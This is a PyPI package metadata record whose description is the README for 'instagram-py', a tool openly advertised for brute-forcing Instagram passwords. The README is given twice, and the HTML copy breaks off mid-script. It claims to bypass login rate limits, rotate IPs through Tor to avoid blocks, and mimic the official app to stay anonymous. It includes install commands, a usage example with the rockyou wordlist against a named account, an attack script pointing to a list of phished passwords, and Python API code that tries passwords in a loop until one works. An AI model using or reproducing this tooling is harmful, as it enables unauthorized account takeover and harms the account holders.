{"info": {"author": "Antony-Jr", "author_email": "antonyjr@protonmail.com", "bugtrack_url": null, "classifiers": ["Natural Language :: English", "Operating System :: OS Independent", "Programming Language :: Python :: 3.4", "Programming Language :: Python :: 3.6", "Topic :: Utilities"], "description": ".. image:: https://raw.githubusercontent.com/antony-jr/instagram-py/master/.img/poster.png\r\n\r\n\r\n\r\n.. raw:: html\r\n \r\n <blockquote>:briefcase: The Official Instagram-Py repo. A professional tool to :8ball: brute force instagram :camera_flash: accounts with less resource :gift: as possible , Written in Python :snake: and made with :heart: -- Antony Jr.</blockquote>\r\n    \r\n \r\n <h1 align=\"center\" > Instagram-Py </h1>\r\n\r\n <p align=center>\r\n <a href=\"https://travis-ci.org/antony-jr/instagram-py\">\r\n <img src=\"https://travis-ci.org/antony-jr/instagram-py.svg?branch=master\" / >\r\n </a>\r\n\r\n <a href=\"https://github.com/antony-jr/instagram-py/issues\">\r\n <img src=\"https://img.shields.io/github/issues/antony-jr/instagram-py.svg?style=flat-square\" / >\r\n </a>\r\n \r\n <a href=\"https://github.com/antony-jr/instagram-py/network\">\r\n <img src=\"https://img.shields.io/github/forks/antony-jr/instagram-py.svg?style=flat-square\" / >\r\n </a>\r\n \r\n <a href=\"https://github.com/antony-jr/instagram-py/stargazers\">\r\n <img src=\"https://img.shields.io/github/stars/antony-jr/instagram-py.svg?style=flat-square\" / >\r\n </a>\r\n \r\n <a href=\"https://github.com/antony-jr/instagram-py/blob/master/LICENSE\">\r\n <img src=\"https://img.shields.io/github/license/antony-jr/instagram-py.svg?style=flat-square\" / >\r\n </a>\r\n \r\n <a class=\"badge-align\" href=\"https://www.codacy.com/app/antony-jr/instagram-py?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=antony-jr/instagram-py&amp;utm_campaign=Badge_Grade\"><img src=\"https://api.codacy.com/project/badge/Grade/352d5096b26e46faaa6b7434ad5afed6\"/></a>\r\n \r\n </p>\r\n\r\n  \r\n  \r\n| This project was started as a **POC** and then evolved into something. I first started this project when a lot of people\r\n| started asking about brute forcing instagram and so I started working on a **Proof-Of-Concept** for brute forcing instagram\r\n| without any password (try) limiting. Another reason to start working on this project was that there was no good tool to do\r\n| this job , Yep! even now if you search through github you cannot find a tool which is good as instagram-py. Since a few people\r\n| liked this tool , I decided to give it a **LTS**. Still there exists some old versions of instagram-py all-over github but\r\n| **this is the official repo**. You can also use **different versions** of **instagram-py** through **pip**. \r\n\r\n\r\n.. raw:: html\r\n\r\n <br>\r\n <p align=center>\r\n <table>\r\n <tr>\r\n <th>DOWNLOAD</th>\r\n <th>INSTALL</th>\r\n </tr>\r\n <tr>\r\n <td>\r\n <a href=\"https://github.com/antony-jr/instagram-py/releases/download/continuous/Instagram-Py-continuous-x86_64.AppImage\">\r\n <img src=\"https://img.shields.io/badge/LINUX_DOWNLOAD-InSTAGRAM--PY%20PORTABLE%20x86__64-brightgreen.svg?style=for-the-badge\" />\r\n </a>\r\n </td>\r\n <td>\r\n <pre>\r\n $ chmod +x Instagram-Py-continous-x86_64.AppImage;\r\n $ ./Instagram-Py-continous-x86_64.AppImage # Just Use!\r\n </pre>\r\n </td>\r\n </tr>\r\n </table>\r\n <br>\r\n <img src=\"https://raw.githubusercontent.com/antony-jr/instagram-py/master/.img/preview.gif\" / >\r\n </p>\r\n\r\n\r\n\r\n------\r\n How?\r\n------\r\n\r\n| We use , **tor** to change our ip once blocked for many tries and continue attack.\r\n| Since the official api is not a hacker wants, So we use the **InstagramAPK signature** to stay **anonymous!**\r\n| And we also **save** the **progress** so that even in network interruption we can avoid breaking the computer!\r\n\r\n\r\n-------\r\n What?\r\n-------\r\n\r\n| **Instagram-Py** is a slick python script to perform  **brute force** attack against **Instagram** ,   \r\n| this script can **bypass** login limiting on wrong passwords ,  so basically it can test **infinite number of passwords**.\r\n| Instagram-Py is **proved** and can test **over 6M** passwords on a single instagram account with **less resource** as possible\r\n| This script mimics the activities of the official **instagram android app** and sends request over **tor** so you are secure ,\r\n| but if your **tor** installation is **misconfigured** then the blame is on you.\r\n\r\n\r\n------------\r\n Features\r\n------------\r\n\r\n* Ultra Portable\r\n\r\n  As of Instagram-Py v2.0.6 , Instagram-Py is also distributed in **AppImages** , If you use\r\n  Instagram-Py bundled in a AppImage , **You do not need to install anything , even tor.**\r\n  Just **download** , **mark it executable** and **enjoy**! \r\n  Now Instagram-Py is the only (*The best of my knowledge*) hacking tool which is ultra portable that you\r\n  can carry in a thumb drive. ( And use it in **any Linux Distro without installing anything**).\r\n  know more in the installation section.\r\n\r\n* Instagram-Py Scripting\r\n\r\n  Craft your own python script which will embed into Instagram-Py for Maximum Customization of your\r\n  brute force attack , example: What if you want a message sent to your phone when an account is hacked?\r\n\r\n* Resumes Attacks when the same wordlist is used on the same Username\r\n* Dumps successfully cracked accounts.\r\n* Maximum Customization! ( This includes multiple attack vectors! )\r\n* Fast and Clean Code , no ugly selenum drivers! ( Pure Requests )\r\n* Elegant Tor Identity Change with Stem ( Tor's Official Library for Python )\r\n\r\n\r\n**Depends on**: python3 , tor ,  requests , requests[socks] , stem (*Don't need anything if you use Instagram-Py Portable*)\r\n\r\n==============\r\n Installation\r\n==============\r\n\r\n------------------------------------------------------------\r\nGet Instagram-Py with Zero Setup ( Instagram-Py Portable )\r\n------------------------------------------------------------\r\n\r\n\r\nJust **execute** this **single command** and you will have everything to start using\r\n**Instagram-Py** right-away!\r\n**This Method is only possible for Linux Distro's with 64Bit Architecture** (*Any Linux Distro which is 64 Bit*).\r\n**If you use this method...**\r\n\r\n* You **don't** need to install anything in your **linux distro**.\r\n* You **don't** even need **python** and **tor server** installed.\r\n* You **don't** need any type of **configuration**. (*It Just Works!*)\r\n\r\n\r\n::\r\n\r\n $ sudo wget -O /usr/bin/instagram-py https://git.io/vxKaq; sudo chmod +x /usr/bin/instagram-py\r\n $ instagram-py # Installed , Easy right ?\r\n\r\n\r\n\r\n**Caution**: Please don't mix up this installation and pip installation as it may give unexpected\r\noutput.\r\n\r\nYou can also download **instagram-py** directly from the release page and save it in a thumb drive\r\nto use it later, Cool right ?\r\n\r\n\r\n---------------------------------\r\n Upgrading Instagram-Py with pip\r\n---------------------------------\r\n\r\n::\r\n\r\n $ sudo pip3 install instagram-py --upgrade\r\n\r\n\r\n-------------------------------\r\n using pip to get Instagram-py\r\n-------------------------------\r\n\r\n**Make sure you have got the latest version of pip(>= 9.0 and python(>= 3.6)**\r\n\r\n::\r\n\r\n $ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip\r\n $ sudo pip3 install requests --upgrade\r\n $ sudo pip3 install requests[socks]\r\n $ sudo pip3 install stem\r\n $ sudo pip3 install instagram-py\r\n $ instagram-py # installed successfully\r\n $ # Configuration is Super Important so Lets Create One\r\n $ instagram-py --create-configuration # follow the steps... \r\n\r\n--------------------------------\r\n    Configuring Instagram-Py\r\n--------------------------------\r\n\r\n**As of v2.0.0 Configuration is Simply done by Passing an Argument to Instagram-Py**\r\n\r\n::\r\n\r\n $ instagram-py --create-configuration\r\n $      # OR\r\n $ instagram-py -cc\r\n\r\n\r\n\r\n**Or if you just want the default settings without the annoying questions then**\r\n\r\n::\r\n\r\n $ instagram-py --create-configuration --default-configuration\r\n $      # OR\r\n $ instagram-py -cc -dc\r\n\r\n\r\n\r\n--------------------------------------------------\r\n    Configuring Tor server to open control port\r\n--------------------------------------------------\r\n\r\nopen your **tor configuration** file usually located at **/etc/tor/torrc**\r\n\r\n\r\n::\r\n \r\n $ sudo vim /etc/tor/torrc # open it with your text editor\r\n \r\n\r\n**search** for the file for this **specific section**\r\n\r\n::\r\n\r\n ## The port on which Tor will listen for local connections from Tor\r\n ## controller applications, as documented in control-spec.txt.\r\n #ControlPort 9051\r\n \r\n**uncomment** 'ControlPort' by deleting the **#** before 'ControlPort' , **now save the file and restart your tor server**\r\n\r\n**now you are ready to crack any instagram account , make sure your tor configuration matched ~/instapy-config.json** \r\n\r\n=============\r\n    Usage\r\n=============\r\n\r\n**Finally** , now you can use instagram-py!\r\n\r\n**Instagram-Py Scripting lets you run Custom Python Scripts Inside Instagram-Py!**\r\n\r\n**Never Run Instagram-Py with Multiple Instance! , Use Instagram-Py Scripting Instead!**\r\n\r\n\r\n::\r\n\r\n $ instagram-py -u your_account_username -pl path_to_password_list\r\n\r\n\r\n**Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**\r\n\r\n::\r\n\r\n usage: instagram-py [-h] [--username USERNAME] [--password-list PASSWORD_LIST]\r\n                     [--script SCRIPT] [--inspect-username INSPECT_USERNAME]\r\n                     [--create-configuration] [--default-configuration]\r\n                     [--countinue] [--verbose]\r\n \r\n optional arguments:\r\n   -h, --help            show this help message and exit\r\n   --username USERNAME, -u USERNAME\r\n                         username for Instagram account\r\n   --password-list PASSWORD_LIST, -pl PASSWORD_LIST\r\n                         password list file to try with the given username.\r\n   --script SCRIPT, -s SCRIPT\r\n                         Instagram-Py Attack Script.\r\n   --inspect-username INSPECT_USERNAME, -i INSPECT_USERNAME\r\n                         Username to inspect in the instagram-py dump.\r\n   --create-configuration, -cc\r\n                         Create a Configuration file for Instagram-Py with\r\n                         ease.\r\n   --default-configuration, -dc\r\n                         noconfirm for Instagram-Py Configuration Creator!\r\n   --continue-attack, -c       Continue the previous attack if found.\r\n   --verbose, -v         Activate Verbose mode. ( Verbose level )\r\n\r\n example: instagram-py -c -vvv -u instatestgod__ -pl rockyou.txt\r\n\r\n Report bug, suggestions and new features at https://github.com/antony-jr/instagram-py\r\n\r\n\r\n\r\n========================\r\n Instagram-Py Scripting\r\n========================\r\n\r\nInstagram-Py now lets you run your custom scripts inside of it for maximum customization of your attacks.\r\nThis Scripts are simple Python Scripts ( You Can just do anything that is possible with python )\r\n\r\n**Witness the power of Instagram-Py Scripting**\r\n\r\n::\r\n\r\n #!/usr/bin/instagram-py -s\r\n # Only Supports Python 3\r\n\r\n import os\r\n\r\n def hacked_an_account(username , password):\r\n    # Use Twilio API to Make a Message to our phone MayBe?\r\n    print(\"Account Cracked!\")\r\n    return True\r\n\r\n\r\n print(\"Initiating Multi Username Attack Script...\")\r\n\r\n global_callback = hacked_an_account\r\n global_password_list = \"{}/.exploits/facebook-phished.txt\".format(os.path.expanduser('~'))\r\n\r\n usernames = [ # Reserved Variable\r\n   {\r\n   \"id\" : \"instatestgod__\",\r\n   \"password_list\" : \"/home/antonyjr/Developer/.exploits/rockyou.txt\" , # full path\r\n   \"continue\" : True, # Optional\r\n   \"verbose\" : 0 # Optional\r\n    },\r\n   # If you want to simultaniously attack the same account with different wordlist\r\n   # Apparently Saving does not work here if two wordlist are used on a single user!\r\n   # could be later fixed anyways...\r\n   {\r\n   \"id\" : \"instatestgod__\",\r\n   # global password list will cover us if password list is not mentioned!\r\n   \"continue\" : False, # Optional\r\n   \"verbose\" : 3 # Optional\r\n   }\r\n   # ,\r\n   # {\r\n   # \"id\" : \"even_more_users\",\r\n   # \"password_list\" : \"different_passwords.lst\",\r\n   # }\r\n ]\r\n\r\n\r\n\r\n**You Can Always View the Cracked Passwords Using this command!**\r\n\r\n::\r\n\r\n $ instagram-py -i instatestgod__\r\n $ # Displays record if it is cracked in the past!\r\n\r\n===========================\r\n Using Instagram-Py as API\r\n===========================\r\n\r\n**Instagram-Py supports to be used as a module as of v1.3.2 , so you don't want to reproduce my code. Just use it!**\r\n\r\nFor some reason you wish not to use my software then you can use my software as a module and embed into your own\r\nsoftware , anyway its native so its just gonna run the same as the official command-line tool unless you do something crazy.\r\n\r\n**Follow the same installation method mentioned above to install Instagram-Py API.**\r\n\r\nThis is a simple script to conduct a bructe force attack using instagram-py as a API.\r\n\r\n::\r\n\r\n #!/usr/bin/env python3\r\n '''\r\n   This is the same thing that is in the __init__ file of the command-line\r\n   tool.\r\n '''\r\n from InstagramPy.InstagramPyCLI import InstagramPyCLI\r\n from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH\r\n from InstagramPy.InstagramPyInstance import InstagramPyInstance\r\n from datetime import datetime\r\n \r\n username = \"TARGET ACCOUNT USERNAME\"\r\n password = \"PASSWORD LIST PATH\"\r\n\r\n appInfo = {\r\n    \"version\"     : \"0.0.1\",\r\n    \"name\"        : \"Instagram-Py Clone\",\r\n    \"description\" : \"Some Module to crack instagram!\",\r\n    \"author\"      : \"YourName\",\r\n    \"company\"     : \"YourCompany\",\r\n    \"year\"        : \"2017\",\r\n    \"example\"     : \"\"\r\n }\r\n\r\n cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)\r\n \r\n '''\r\n # USE THIS IF YOU WANT\r\n cli.PrintHeader()\r\n cli.PrintDatetime()\r\n '''\r\n session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)\r\n session.ReadSaveFile(True) # True to countinue attack if found save file.\r\n '''\r\n # USE THIS IF YOU WANT\r\n cli.PrintMagicCookie(session.magic_cookie)\r\n '''\r\n\r\n '''\r\n  Defining @param cli = None will make Instagram-Py run silently so you\r\n  can you use your own interface if you like.\r\n  or if you want to use the official interface then declare like this\r\n\r\n  instagrampy = InstagramPyInstance(cli = cli , session = session)\r\n\r\n '''\r\n\r\n instagrampy = InstagramPyInstance(cli = None ,session = session)\r\n while not instagrampy.PasswordFound():\r\n        print('Trying... '+session.CurrentPassword())\r\n        instagrampy.TryPassword()\r\n\r\n if instagrampy.PasswordFound():\r\n        print('Password Found: '+session.CurrentPassword())\r\n\r\n exit(0) \r\n \r\n\r\n\r\n=========\r\nSupport\r\n=========\r\n\r\nIf you think that this project is **cool** then you can give it a :star: or :fork_and_knife: it if you want to improve it with me. I really :heart: stars though!   \r\n\r\n.. raw:: html\r\n\r\n <p align=\"center\">\r\n     <a href=\"https://liberapay.com/antonyjr/donate\">\r\n        <img src=\"https://liberapay.com/assets/widgets/donate.svg\">\r\n     </a>\r\n </p>\r\n\r\n\r\nIf you want to do something that stands out then you can click the **donate** button at the top to make a monthly donation , So   \r\nI will make sure that I stay healthy and keep on to do my work. :briefcase: Supporting me means supporting all of my projects , So   \r\nyou are like **Tony Stark** :heart: who backs **Spider-Man**! Thank you for your extra care! :dog:   \r\n\r\nYou can also tweet about me on twitter , get connected with me here -> https://twitter.com/antonyjr0\r\n\r\nThank You! :smiley_cat:\r\n\r\n\r\n\r\n=============\r\n   License\r\n=============\r\n\r\nThe MIT License,\r\n\r\nCopyright (C) 2018 The Future Shell , Antony Jr.\r\n", "description_content_type": "", "docs_url": null, "download_url": "https://github.com/antony-jr/instagram-py/archive/v2.0.7.tar.gz", "downloads": {"last_day": -1, "last_month": -1, "last_week": -1}, "home_page": "https://github.com/antony-jr/Instagram-Py", "keywords": "cli", "license": "MIT", "maintainer": "", "maintainer_email": "", "name": "instagram-py", "package_url": "https://pypi.org/project/instagram-py/", "platform": "", "project_url": "https://pypi.org/project/instagram-py/", "project_urls": {"Download": "https://github.com/antony-jr/instagram-py/archive/v2.0.7.tar.gz", "Homepage": "https://github.com/antony-jr/Instagram-Py"}, "release_url": "https://pypi.org/project/instagram-py/2.0.7/", "requires_dist": null, "requires_python": "", "summary": "Slick Instagram brute force command line tool writen in python.", "version": "2.0.7", "yanked": false, "html_description": "<div class=\"project-description\">\n            .. image:: https://raw.githubusercontent.com/antony-jr/instagram-py/master/.img/poster.png\n<br>\n<br>\n<br>\n<br>.. raw:: html\n<br> \n<br> &lt;blockquote&gt;:briefcase: The Official Instagram-Py repo. A professional tool to :8ball: brute force instagram :camera_flash: accounts with less resource :gift: as possible , Written in Python :snake: and made with :heart: -- Antony Jr.&lt;/blockquote&gt;\n<br>    \n<br> \n<br> &lt;h1 align=\"center\" &gt; Instagram-Py &lt;/h1&gt;\n<br>\n<br> &lt;p align=center&gt;\n<br> &lt;a href=\"https://travis-ci.org/antony-jr/instagram-py\"&gt;\n<br> &lt;img src=\"https://travis-ci.org/antony-jr/instagram-py.svg?branch=master\" / &gt;\n<br> &lt;/a&gt;\n<br>\n<br> &lt;a href=\"https://github.com/antony-jr/instagram-py/issues\"&gt;\n<br> &lt;img src=\"https://img.shields.io/github/issues/antony-jr/instagram-py.svg?style=flat-square\" / &gt;\n<br> &lt;/a&gt;\n<br> \n<br> &lt;a href=\"https://github.com/antony-jr/instagram-py/network\"&gt;\n<br> &lt;img src=\"https://img.shields.io/github/forks/antony-jr/instagram-py.svg?style=flat-square\" / &gt;\n<br> &lt;/a&gt;\n<br> \n<br> &lt;a href=\"https://github.com/antony-jr/instagram-py/stargazers\"&gt;\n<br> &lt;img src=\"https://img.shields.io/github/stars/antony-jr/instagram-py.svg?style=flat-square\" / &gt;\n<br> &lt;/a&gt;\n<br> \n<br> &lt;a href=\"https://github.com/antony-jr/instagram-py/blob/master/LICENSE\"&gt;\n<br> &lt;img src=\"https://img.shields.io/github/license/antony-jr/instagram-py.svg?style=flat-square\" / &gt;\n<br> &lt;/a&gt;\n<br> \n<br> &lt;a class=\"badge-align\" href=\"https://www.codacy.com/app/antony-jr/instagram-py?utm_source=github.com&amp;amp;utm_medium=referral&amp;amp;utm_content=antony-jr/instagram-py&amp;amp;utm_campaign=Badge_Grade\"&gt;&lt;img src=\"https://api.codacy.com/project/badge/Grade/352d5096b26e46faaa6b7434ad5afed6\"/&gt;&lt;/a&gt;\n<br> \n<br> &lt;/p&gt;\n<br>\n<br>  \n<br>  \n<br>| This project was started as a **POC** and then evolved into something. I first started this project when a lot of people\n<br>| started asking about brute forcing instagram and so I started working on a **Proof-Of-Concept** for brute forcing instagram\n<br>| without any password (try) limiting. Another reason to start working on this project was that there was no good tool to do\n<br>| this job , Yep! even now if you search through github you cannot find a tool which is good as instagram-py. Since a few people\n<br>| liked this tool , I decided to give it a **LTS**. Still there exists some old versions of instagram-py all-over github but\n<br>| **this is the official repo**. You can also use **different versions** of **instagram-py** through **pip**. \n<br>\n<br>\n<br>.. raw:: html\n<br>\n<br> &lt;br&gt;\n<br> &lt;p align=center&gt;\n<br> &lt;table&gt;\n<br> &lt;tr&gt;\n<br> &lt;th&gt;DOWNLOAD&lt;/th&gt;\n<br> &lt;th&gt;INSTALL&lt;/th&gt;\n<br> &lt;/tr&gt;\n<br> &lt;tr&gt;\n<br> &lt;td&gt;\n<br> &lt;a href=\"https://github.com/antony-jr/instagram-py/releases/download/continuous/Instagram-Py-continuous-x86_64.AppImage\"&gt;\n<br> &lt;img src=\"https://img.shields.io/badge/LINUX_DOWNLOAD-InSTAGRAM--PY%20PORTABLE%20x86__64-brightgreen.svg?style=for-the-badge\" /&gt;\n<br> &lt;/a&gt;\n<br> &lt;/td&gt;\n<br> &lt;td&gt;\n<br> &lt;pre&gt;\n<br> $ chmod +x Instagram-Py-continous-x86_64.AppImage;\n<br> $ ./Instagram-Py-continous-x86_64.AppImage # Just Use!\n<br> &lt;/pre&gt;\n<br> &lt;/td&gt;\n<br> &lt;/tr&gt;\n<br> &lt;/table&gt;\n<br> &lt;br&gt;\n<br> &lt;img src=\"https://raw.githubusercontent.com/antony-jr/instagram-py/master/.img/preview.gif\" / &gt;\n<br> &lt;/p&gt;\n<br>\n<br>\n<br>\n<br>------\n<br> How?\n<br>------\n<br>\n<br>| We use , **tor** to change our ip once blocked for many tries and continue attack.\n<br>| Since the official api is not a hacker wants, So we use the **InstagramAPK signature** to stay **anonymous!**\n<br>| And we also **save** the **progress** so that even in network interruption we can avoid breaking the computer!\n<br>\n<br>\n<br>-------\n<br> What?\n<br>-------\n<br>\n<br>| **Instagram-Py** is a slick python script to perform  **brute force** attack against **Instagram** ,   \n<br>| this script can **bypass** login limiting on wrong passwords ,  so basically it can test **infinite number of passwords**.\n<br>| Instagram-Py is **proved** and can test **over 6M** passwords on a single instagram account with **less resource** as possible\n<br>| This script mimics the activities of the official **instagram android app** and sends request over **tor** so you are secure ,\n<br>| but if your **tor** installation is **misconfigured** then the blame is on you.\n<br>\n<br>\n<br>------------\n<br> Features\n<br>------------\n<br>\n<br>* Ultra Portable\n<br>\n<br>  As of Instagram-Py v2.0.6 , Instagram-Py is also distributed in **AppImages** , If you use\n<br>  Instagram-Py bundled in a AppImage , **You do not need to install anything , even tor.**\n<br>  Just **download** , **mark it executable** and **enjoy**! \n<br>  Now Instagram-Py is the only (*The best of my knowledge*) hacking tool which is ultra portable that you\n<br>  can carry in a thumb drive. ( And use it in **any Linux Distro without installing anything**).\n<br>  know more in the installation section.\n<br>\n<br>* Instagram-Py Scripting\n<br>\n<br>  Craft your own python script which will embed into Instagram-Py for Maximum Customization of your\n<br>  brute force attack , example: What if you want a message sent to your phone when an account is hacked?\n<br>\n<br>* Resumes Attacks when the same wordlist is used on the same Username\n<br>* Dumps successfully cracked accounts.\n<br>* Maximum Customization! ( This includes multiple attack vectors! )\n<br>* Fast and Clean Code , no ugly selenum drivers! ( Pure Requests )\n<br>* Elegant Tor Identity Change with Stem ( Tor's Official Library for Python )\n<br>\n<br>\n<br>**Depends on**: python3 , tor ,  requests , requests[socks] , stem (*Don't need anything if you use Instagram-Py Portable*)\n<br>\n<br>==============\n<br> Installation\n<br>==============\n<br>\n<br>------------------------------------------------------------\n<br>Get Instagram-Py with Zero Setup ( Instagram-Py Portable )\n<br>------------------------------------------------------------\n<br>\n<br>\n<br>Just **execute** this **single command** and you will have everything to start using\n<br>**Instagram-Py** right-away!\n<br>**This Method is only possible for Linux Distro's with 64Bit Architecture** (*Any Linux Distro which is 64 Bit*).\n<br>**If you use this method...**\n<br>\n<br>* You **don't** need to install anything in your **linux distro**.\n<br>* You **don't** even need **python** and **tor server** installed.\n<br>* You **don't** need any type of **configuration**. (*It Just Works!*)\n<br>\n<br>\n<br>::\n<br>\n<br> $ sudo wget -O /usr/bin/instagram-py https://git.io/vxKaq; sudo chmod +x /usr/bin/instagram-py\n<br> $ instagram-py # Installed , Easy right ?\n<br>\n<br>\n<br>\n<br>**Caution**: Please don't mix up this installation and pip installation as it may give unexpected\n<br>output.\n<br>\n<br>You can also download **instagram-py** directly from the release page and save it in a thumb drive\n<br>to use it later, Cool right ?\n<br>\n<br>\n<br>---------------------------------\n<br> Upgrading Instagram-Py with pip\n<br>---------------------------------\n<br>\n<br>::\n<br>\n<br> $ sudo pip3 install instagram-py --upgrade\n<br>\n<br>\n<br>-------------------------------\n<br> using pip to get Instagram-py\n<br>-------------------------------\n<br>\n<br>**Make sure you have got the latest version of pip(&gt;= 9.0 and python(&gt;= 3.6)**\n<br>\n<br>::\n<br>\n<br> $ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip\n<br> $ sudo pip3 install requests --upgrade\n<br> $ sudo pip3 install requests[socks]\n<br> $ sudo pip3 install stem\n<br> $ sudo pip3 install instagram-py\n<br> $ instagram-py # installed successfully\n<br> $ # Configuration is Super Important so Lets Create One\n<br> $ instagram-py --create-configuration # follow the steps... \n<br>\n<br>--------------------------------\n<br>    Configuring Instagram-Py\n<br>--------------------------------\n<br>\n<br>**As of v2.0.0 Configuration is Simply done by Passing an Argument to Instagram-Py**\n<br>\n<br>::\n<br>\n<br> $ instagram-py --create-configuration\n<br> $      # OR\n<br> $ instagram-py -cc\n<br>\n<br>\n<br>\n<br>**Or if you just want the default settings without the annoying questions then**\n<br>\n<br>::\n<br>\n<br> $ instagram-py --create-configuration --default-configuration\n<br> $      # OR\n<br> $ instagram-py -cc -dc\n<br>\n<br>\n<br>\n<br>--------------------------------------------------\n<br>    Configuring Tor server to open control port\n<br>--------------------------------------------------\n<br>\n<br>open your **tor configuration** file usually located at **/etc/tor/torrc**\n<br>\n<br>\n<br>::\n<br> \n<br> $ sudo vim /etc/tor/torrc # open it with your text editor\n<br> \n<br>\n<br>**search** for the file for this **specific section**\n<br>\n<br>::\n<br>\n<br> ## The port on which Tor will listen for local connections from Tor\n<br> ## controller applications, as documented in control-spec.txt.\n<br> #ControlPort 9051\n<br> \n<br>**uncomment** 'ControlPort' by deleting the **#** before 'ControlPort' , **now save the file and restart your tor server**\n<br>\n<br>**now you are ready to crack any instagram account , make sure your tor configuration matched ~/instapy-config.json** \n<br>\n<br>=============\n<br>    Usage\n<br>=============\n<br>\n<br>**Finally** , now you can use instagram-py!\n<br>\n<br>**Instagram-Py Scripting lets you run Custom Python Scripts Inside Instagram-Py!**\n<br>\n<br>**Never Run Instagram-Py with Multiple Instance! , Use Instagram-Py Scripting Instead!**\n<br>\n<br>\n<br>::\n<br>\n<br> $ instagram-py -u your_account_username -pl path_to_password_list\n<br>\n<br>\n<br>**Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**\n<br>\n<br>::\n<br>\n<br> usage: instagram-py [-h] [--username USERNAME] [--password-list PASSWORD_LIST]\n<br>                     [--script SCRIPT] [--inspect-username INSPECT_USERNAME]\n<br>                     [--create-configuration] [--default-configuration]\n<br>                     [--countinue] [--verbose]\n<br> \n<br> optional arguments:\n<br>   -h, --help            show this help message and exit\n<br>   --username USERNAME, -u USERNAME\n<br>                         username for Instagram account\n<br>   --password-list PASSWORD_LIST, -pl PASSWORD_LIST\n<br>                         password list file to try with the given username.\n<br>   --script SCRIPT, -s SCRIPT\n<br>                         Instagram-Py Attack Script.\n<br>   --inspect-username INSPECT_USERNAME, -i INSPECT_USERNAME\n<br>                         Username to inspect in the instagram-py dump.\n<br>   --create-configuration, -cc\n<br>                         Create a Configuration file for Instagram-Py with\n<br>                         ease.\n<br>   --default-configuration, -dc\n<br>                         noconfirm for Instagram-Py Configuration Creator!\n<br>   --continue-attack, -c       Continue the previous attack if found.\n<br>   --verbose, -v         Activate Verbose mode. ( Verbose level )\n<br>\n<br> example: instagram-py -c -vvv -u instatestgod__ -pl rockyou.txt\n<br>\n<br> Report bug, suggestions and new features at https://github.com/antony-jr/instagram-py\n<br>\n<br>\n<br>\n<br>========================\n<br> Instagram-Py Scripting\n<br>========================\n<br>\n<br>Instagram-Py now lets you run your custom scripts inside of it for maximum customization of your attacks.\n<br>This Scripts are simple Python Scripts ( You Can just do anything that is possible with python )\n<br>\n<br>**Witness the power of Instagram-Py Scripting**\n<br>\n<br>::\n<br>\n<br> #!/usr/bin/instagram-py -s\n<br> # Only Supports Python 3\n<br>\n<br> import os\n<br>\n<br> def hacked_an_account(username , password):\n<br>    # Use Twilio API to Make a Message to our phone MayBe?\n<br>    print(\"Account Cracked!\")\n<br>    return True\n<br>\n<br>\n<br> print(\"Initiating Multi Username Attack Script...\")\n<br>\n<br> global_callback = hacked_an_account\n<br> global_password_list = \"{}/.exploits/facebook-phished.txt\".format(os.path.expanduser('~'))\n<br>\n<br> usernames = [ # Reserved Variable\n<br>   {\n<br>   \"id\" : \"instatestgod__\",\n<br>   \"password_list\" : \"/home/antonyjr/Developer/.exploits/rockyou.txt\" , # full path\n<br>   \"continue\" : True, # Optional\n<br>   \"verbose\" : 0 # Optional\n<br>    },\n<br>   # If you want to simultaniously attack the same account with different wordlist\n<br>   # Apparently Saving does not work here if two wordlist are used on a single user!\n<br>   # could be later fixed anyways...\n<br>   {\n<br>   \"id\" : \"instatestgod__\",\n<br>   # global password list will cover us if password list is not mentioned!\n<br>   \"continue\" : False, # Optional\n<br>   \"verbose\" : 3 # Optional\n<br>   }\n<br>   # ,\n<br>   # {\n<br>   # \"id\" : \"even_more_users\",\n<br>   # \"password_list\" : \"different_passwords.lst\",\n<br>   # }\n<br> ]\n<br>\n<br>\n<br>\n<br>**You Can Always View the Cracked Passwords Using this command!**\n<br>\n<br>::\n<br>\n<br> $ instagram-py -i instatestgod__\n<br> $ # Displays record if it is cracked in the past!\n<br>\n<br>===========================\n<br> Using Instagram-Py as API\n<br>===========================\n<br>\n<br>**Instagram-Py supports to be used as a module as of v1.3.2 , so you don't want to reproduce my code. Just use it!**\n<br>\n<br>For some reason you wish not to use my software then you can use my software as a module and embed into your own\n<br>software , anyway its native so its just gonna run the same as the official command-line tool unless you do something crazy.\n<br>\n<br>**Follow the same installation method mentioned above to install Instagram-Py API.**\n<br>\n<br>This is a simple script to conduct a bructe force attack using instagram-py as a API.\n<br>\n<br>::\n<br>\n<br> #!/usr/bin/env python3\n<br> '''\n<br>   This is the same thing that is in the __init__ file of the command-line\n<br>   tool.\n<br> '''\n<br> from InstagramPy.InstagramPyCLI import InstagramPyCLI\n<br> from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH\n<br> from InstagramPy.InstagramPyInstance import InstagramPyInstance\n<br> from datetime import datetime\n<br> \n<br> username = \"TARGET ACCOUNT USERNAME\"\n<br> password = \"PASSWORD LIST PATH\"\n<br>\n<br> appInfo = {\n<br>    \"version\"     : \"0.0.1\",\n<br>    \"name\"        : \"Instagram-Py Clone\",\n<br>    \"description\" : \"Some Module to crack instagram!\",\n<br>    \"author\"      : \"YourName\",\n<br>    \"company\"     : \"YourCompany\",\n<br>    \"year\"        : \"2017\",\n<br>    \"example\"     : \"\"\n<br> }\n<br>\n<br> cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)\n<br> \n<br> '''\n<br> # USE THIS IF YOU WANT\n<br> cli.PrintHeader()\n<br> cli.PrintDatetime()\n<br> '''\n<br> session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)\n<br> session.ReadSaveFile(True) # True to countinue attack if found save file.\n<br> '''\n<br> # USE THIS IF YOU WANT\n<br> cli.PrintMagicCookie(session.magic_cookie)\n<br> '''\n<br>\n<br> '''\n<br>  Defining @param cli = None will make Instagram-Py run silently so you\n<br>  can you use your own interface if you like.\n<br>  or if you want to use the official interface then declare like this\n<br>\n<br>  instagrampy = InstagramPyInstance(cli = cli , session = session)\n<br>\n<br> '''\n<br>\n<br> instagrampy = InstagramPyInstance(cli = None ,session = session)\n<br> while not instagrampy.PasswordFound():\n<br>        print('Trying... '+session.CurrentPassword())\n<br>        instagrampy.TryPassword()\n<br>\n<br> if 